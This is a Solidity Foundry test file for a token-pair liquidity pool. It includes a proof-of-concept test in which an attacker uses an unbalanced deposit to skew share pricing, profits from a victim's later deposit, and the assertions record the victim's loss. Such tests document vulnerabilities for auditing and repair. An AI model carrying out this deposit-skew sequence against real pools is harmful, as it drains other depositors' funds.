// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Token} from "../src/Token.sol";
import {Pool} from "../src/Pool.sol";

contract LockedPoolAttackTest is Test {
    Token token0;
    Token token1;
    Pool pool;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        token0 = new Token("Token 0", "T0");
        token1 = new Token("Token 1", "T1");
        pool = new Pool(token0, token1);

        token0.mint(attacker, 200_000);
        token1.mint(attacker, 200_000);

        token0.mint(victim, 10_000);
        token1.mint(victim, 10_000);

        vm.startPrank(attacker);
        token0.approve(address(pool), type(uint256).max);
        token1.approve(address(pool), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim);
        token0.approve(address(pool), type(uint256).max);
        token1.approve(address(pool), type(uint256).max);
        vm.stopPrank();
    }

    function test_NoLockAttackIsBlockedByTheLock() public {
        // A 4 / 4 deposit would mint only 4 initial shares.
        // The real pool requires more than 100 shares for its first deposit.
        vm.expectRevert(Pool.ZeroShares.selector);
        vm.prank(attacker);
        pool.addLiquidity(4, 4);

        // The failed deposit must leave all pool state unchanged.
        assertEq(pool.reserve0(), 0);
        assertEq(pool.reserve1(), 0);
        assertEq(pool.totalShares(), 0);
        assertEq(pool.shares(attacker), 0);

        assertEq(token0.balanceOf(address(pool)), 0);
        assertEq(token1.balanceOf(address(pool)), 0);
        assertEq(token0.balanceOf(attacker), 200_000);
        assertEq(token1.balanceOf(attacker), 200_000);
    }

    function test_SkewAttackStillProfitsAgainstRealPool() public {
        uint256 attackerToken0Start = token0.balanceOf(attacker);
        uint256 attackerToken1Start = token1.balanceOf(attacker);
        uint256 victimToken0Start = token0.balanceOf(victim);
        uint256 victimToken1Start = token1.balanceOf(victim);

        // Step 1: legal initial deposit.
        vm.prank(attacker);
        uint256 initialShares = pool.addLiquidity(1_000, 1_000);

        assertEq(initialShares, 900);
        assertEq(pool.shares(attacker), 900);
        assertEq(pool.totalShares(), 1_000);
        assertEq(pool.reserve0(), 1_000);
        assertEq(pool.reserve1(), 1_000);

        // Step 2: the attacker's unbalanced deposit.
        vm.prank(attacker);
        uint256 skewShares = pool.addLiquidity(30_000, 1_000);

        assertEq(skewShares, 1_000);
        assertEq(pool.shares(attacker), 1_900);
        assertEq(pool.totalShares(), 2_000);
        assertEq(pool.reserve0(), 31_000);
        assertEq(pool.reserve1(), 2_000);

        // Step 3: the victim deposits 10,000 of each token.
        vm.prank(victim);
        uint256 victimSharesMinted = pool.addLiquidity(10_000, 10_000);

        assertEq(victimSharesMinted, 645);
        assertEq(pool.shares(attacker), 1_900);
        assertEq(pool.shares(victim), 645);
        assertEq(pool.totalShares(), 2_645);
        assertEq(pool.reserve0(), 41_000);
        assertEq(pool.reserve1(), 12_000);

        // The attacker withdraws first. Read shares before vm.prank.
        uint256 attackerSharesToWithdraw = pool.shares(attacker);

        vm.prank(attacker);
        (uint256 attackerOut0, uint256 attackerOut1) = pool.removeLiquidity(attackerSharesToWithdraw);

        assertEq(attackerOut0, 29_451);
        assertEq(attackerOut1, 8_620);

        assertEq(pool.reserve0(), 11_549);
        assertEq(pool.reserve1(), 3_380);
        assertEq(pool.totalShares(), 745);

        // The victim withdraws their remaining share position.
        uint256 victimSharesToWithdraw = pool.shares(victim);

        vm.prank(victim);
        (uint256 victimOut0, uint256 victimOut1) = pool.removeLiquidity(victimSharesToWithdraw);

        assertEq(victimOut0, 9_998);
        assertEq(victimOut1, 2_926);

        // The locked shares and remaining assets stay in the pool.
        assertEq(pool.shares(attacker), 0);
        assertEq(pool.shares(victim), 0);
        assertEq(pool.totalShares(), 100);
        assertEq(pool.reserve0(), 1_551);
        assertEq(pool.reserve1(), 454);

        assertEq(token0.balanceOf(address(pool)), pool.reserve0());
        assertEq(token1.balanceOf(address(pool)), pool.reserve1());

        // Attacker's net change.
        assertEq(int256(token0.balanceOf(attacker)) - int256(attackerToken0Start), -1_549);
        assertEq(int256(token1.balanceOf(attacker)) - int256(attackerToken1Start), 6_620);

        // Victim's loss.
        assertEq(victimToken0Start - token0.balanceOf(victim), 2);
        assertEq(victimToken1Start - token1.balanceOf(victim), 7_074);

        assertEq(token0.balanceOf(victim), 9_998);
        assertEq(token1.balanceOf(victim), 2_926);
    }
}
